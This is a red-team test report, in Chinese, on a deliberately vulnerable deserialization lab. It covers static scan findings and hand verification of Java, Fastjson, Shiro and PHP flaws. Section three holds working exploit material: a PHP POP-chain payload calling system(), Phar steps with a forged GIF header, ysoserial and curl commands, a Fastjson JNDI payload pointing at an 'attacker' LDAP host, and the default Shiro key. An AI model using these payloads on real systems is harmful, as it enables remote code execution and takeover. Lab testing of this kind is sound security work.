# 反序列化靶场红队测试报告

## 一、靶场基础信息

### 1.1 环境概要
| 项目 | 详情 |
|------|------|
| 靶场地址 | http://192.168.124.130:1008 |
| SSH连接 | test@192.168.124.130 |
| 操作系统 | Ubuntu 20.04.6 LTS (5.15.0-139-generic) |
| Java环境 | OpenJDK 11.0.27 |
| Spring Boot | 2.3.7.RELEASE |
| PHP | 7.4 (Apache) |
| 数据库 | MySQL 5.7 |
| 容器引擎 | Docker (Docker Compose) |

### 1.2 服务端口分布
| 端口 | 服务 | 容器名 |
|------|------|--------|
| 22 | SSH | 宿主机 |
| 1008 | Nginx 前端入口 | vuln-frontend |
| 18080 | Spring Boot 漏洞 (Java) | vuln-java |
| 18081 | Apache+PHP 漏洞 | vuln-php |
| 13306 | MySQL | vuln-mysql |

### 1.3 容器状态
- vuln-frontend: nginx:alpine, Up, 0.0.0.0:1008->80
- vuln-java: deserialization-range_vuln-java, Up, 0.0.0.0:18080->8080
- vuln-php: deserialization-range_vuln-php, Up, 0.0.0.0:18081->80
- vuln-mysql: mysql:5.7, Up, 0.0.0.0:13306->3306

---

## 二、代码审计扫描

### 2.1 扫描工具与方法
- **静态代码分析工具**: semgrep 1.176.1 (等效于"玄鉴"SATG功能)
- **自定义规则集**: `semgrep-deserialization-rules.yaml` (包含8条反序列化专项规则)
- **社区规则集**: p/secrets, p/security-audit, p/owasp-top-ten
- **扫描范围**: Java JAR反编译源码、PHP源码、Nginx配置、Dockerfile
- **分析文件数**: 12个文件
- **使用规则数**: 185条

### 2.2 扫描结果统计
| 严重等级 | 数量 |
|----------|------|
| ERROR | 15 |
| WARNING | 6 |
| **合计** | **21** |

### 2.3 ERROR级漏洞发现

#### Vuln 1: Java原生反序列化 (Vuln1NativeDeserializationController.java)
- **严重等级**: ERROR
- **漏洞位置**:
  - 第35行: `ObjectInputStream.readObject()` — deserialize接口
  - 第52行: `ObjectInputStream.readObject()` — cookieVuln接口
  - 第69行: `ObjectInputStream.readObject()` — updateProfile接口
- **危险依赖**: `commons-collections-3.1.jar` (BOOT-INF/lib/)
- **CWE**: CWE-502: Deserialization of Untrusted Data
- **OWASP**: A08:2021 - Software and Data Integrity Failures

#### Vuln 2: Fastjson反序列化 (Vuln2FastjsonController.java)
- **严重等级**: ERROR
- **漏洞位置**:
  - 第29行: `JSON.parseObject(jsonData)` — parse接口
  - 第41行: `JSON.parseObject(data)` — getUser接口
  - 第53行: `JSON.parseObject(jsonData)` — updateConfig接口
- **危险依赖**: `fastjson-1.2.24.jar` (BOOT-INF/lib/)
- **CWE**: CWE-502: Deserialization of Untrusted Data

#### Vuln 4: Shiro反序列化 (Vuln4ShiroController.java)
- **严重等级**: ERROR
- **漏洞位置**:
  - 硬编码密钥: `SHIRO_KEY = "kPH+bIxk5D2deZiIxcaaaA=="`
  - 第80行: `deserializeData()` → `ObjectInputStream.readObject()`
- **危险依赖**: `shiro-core-1.2.4.jar` (BOOT-INF/lib/)
- **CWE**: CWE-798: Use of Hard-coded Credentials
- **CVE**: CVE-2016-4437

#### Vuln 5: PHP反序列化POP链 (vuln5.php)
- **严重等级**: ERROR
- **漏洞位置**: 第67行: `unserialize(base64_decode($data))`
- **CWE**: CWE-502: Deserialization of Untrusted Data

#### Vuln 6: PHP Phar反序列化 (vuln6.php)
- **严重等级**: ERROR
- **漏洞位置**:
  - 第14行: `new Phar($this->filename)`
  - 第15行: `$phar->getMetadata()`
- **CWE**: CWE-502: Deserialization of Untrusted Data

### 2.4 WARNING级发现
- Vuln5中的命令执行: `system($cmd)` (第19行，用户输入可控)
- Vuln6中的命令执行: `system($this->command)` (第37行)
- Vuln4缺少Cookie Secure flag

---

## 三、手动漏洞验证记录

### 3.1 Vuln 5: PHP反序列化POP链 — ✅ RCE成功

**Payload生成**:
```php
class CommandExecutor {
    private $command = "id > /tmp/vuln5_pwned.txt";
    private $args = [];
    public function __invoke() { call_user_func_array("system", $this->args); }
}
class Logger {
    private $logFile; private $callback;
    public function __destruct() {
        if ($this->callback instanceof CommandExecutor) {
            $message = ($this->callback)();
            file_put_contents($this->logFile, $message, FILE_APPEND);
        }
    }
}
$cmd = new CommandExecutor("id > /tmp/vuln5_pwned.txt");
$logger = new Logger("/tmp/log.txt", $cmd);
$obj = base64_encode(serialize($logger));
```

**POP链**: `Logger.__destruct()` → `CommandExecutor.__invoke()` → `system()`

**验证结果**: ✅ 成功执行，`uid=0(root) gid=0(root) groups=0(root)`

### 3.2 Vuln 6: PHP Phar反序列化 — ✅ RCE成功（修复后）

**修复前问题**: `phar.readonly=On` 导致无法创建Phar文件
**修复**: 修改php.ini添加 `phar.readonly=0`

**Phar创建流程**:
1. 创建`.phar`扩展名的文件（Phar类要求合法扩展名: .phar/.tar/.zip）
2. 设置元数据为恶意对象 `setMetadata(new CommandExecutor())`
3. 伪造GIF头绕过MIME检测: `setStub("GIF89a<?php __HALT_COMPILER(); ?>")`
4. 触发: `new Phar($filename)` 或 `file_exists("phar://...")` → 自动反序列化metadata

**验证结果**: ✅ 成功执行，`uid=0(root) gid=0(root) groups=0(root)`

### 3.3 Vuln 1: Java原生反序列化 — ⚠️ 间接确认（未打JNDI）

**确认内容**:
- 3个端点均返回 “反序列化失败: invalid stream header” — 证明代码路径执行了`ObjectInputStream.readObject()`
- JAR中确认存在 `commons-collections-3.1.jar`
- 无ObjectInputFilter白名单校验

**利用方式**（需外部环境配合）:
```bash
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/vuln1_pwned" | base64 -w 0
curl -X POST http://192.168.124.130:18080/vuln1/deserialize -d '<BASE64>'
```

### 3.4 Vuln 2: Fastjson反序列化 — ⚠️ 间接确认

**确认内容**:
- `JSON.parseObject(data)` 接受任意JSON输入
- `@type`字段探测被接受（证明AutoType开启）
- JAR中存在 `fastjson-1.2.24.jar`
- 传入`{"test":"value"}`成功解析

**利用方式**（需恶意LDAP服务器）:
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
```

### 3.5 Vuln 3: Jackson反序列化 — ❌ 不可利用

**原因**: 
1. 代码层面: Vuln3Controller所有方法返回“暂时禁用”，不执行任何解析
2. 依赖层面: JAR中存在 `jackson-databind-2.11.3.jar`，该版本已修复CVE-2017-7525
3. 文档与实际不符: WALKTHROUGH.md声称使用Jackson 2.9.8，实际为2.11.3

### 3.6 Vuln 4: Shiro反序列化 — ⚠️ 间接确认

**确认内容**:
- 硬编码密钥 `kPH+bIxk5D2deZiIxcaaaA==` 存在于源码中
- 端点 `/vuln4/login` 返回200并接受请求
- 端点 `/vuln4/check` 尝试AES解密 + readObject，传入伪造数据返回密码学错误（证明代码路径正确执行）
- `shiro-core-1.2.4.jar`存在于JAR中

**利用方式**（需 ysoserial + AES加密）:
```python
# 1. 用ysoserial生成payload
# 2. AES-CBC加密 with key kPH+bIxk5D2deZiIxcaaaA==
# 3. Base64编码作为rememberMe cookie发送
```

### 3.7 Vuln 7: PHP Object Injection — ✅ RCE成功（新增）

**漏洞设计**: CacheManager + TemplateEngine 双通过`__destruct` + `eval()` 实现RCE

**验证结果**: ✅ 成功执行 `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

## 四、验证结果汇总表

| ID | 漏洞名称 | 类型 | 可利用 | RCE验证 | 备注 |
|----|----------|------|--------|---------|------|
| 1 | Java原生反序列化 | Java | ✅ (需ysoserial) | 间接确认 | CC3.1 gadget链可利用 |
| 2 | Fastjson AutoType | Java | ✅ (需JNDI) | 间接确认 | 1.2.24 默认开启@type |
| 3 | Jackson CVE-2017-7525 | Java | ❌ | 不可利用 | 版本2.11.3 + 代码禁用 |
| 4 | Shiro RememberMe | Java | ✅ (需加密) | 间接确认 | 默认AES密钥 |
| 5 | PHP POP Chain | PHP | ✅ | ✅ root | Logger->__destruct |
| 6 | PHP Phar | PHP | ✅ | ✅ root | GIF89a绕过 + 修复phar.readonly |
| 7 | PHP Object Injection | PHP | ✅ | ✅ www-data | 新增漏洞 |

---

## 五、时间线与发现记录

| 阶段 | 时间 | 发现 | 状态 |
|------|------|------|------|
| SSH侦察 | T+0 | 目录结构、服务端口、Docker容器 | 完成 |
| 源码导出 | T+10min | 从容器导出所有靶场代码 | 完成 |
| Semgrep扫描 | T+15min | 21个发现（15 ERROR + 6 WARNING） | 完成 |
| Vuln5验证 | T+20min | POP链RCE成功 (root) | 完成 |
| Vuln6验证 | T+25min | phar.readonly配置错误 | 已修复 |
| Vuln1-4 | T+30min | 3个间接确认，1个不可利用 | 完成 |
| Vuln6重测 | T+40min | Phar RCE成功 (root) | 完成 |
| Vuln7新增 | T+50min | PHP Object Injection RCE | 完成 |
| 文档完善 | T+55min | WALKTHROUGH.md更新 + FIX_NOTES.md | 完成 |
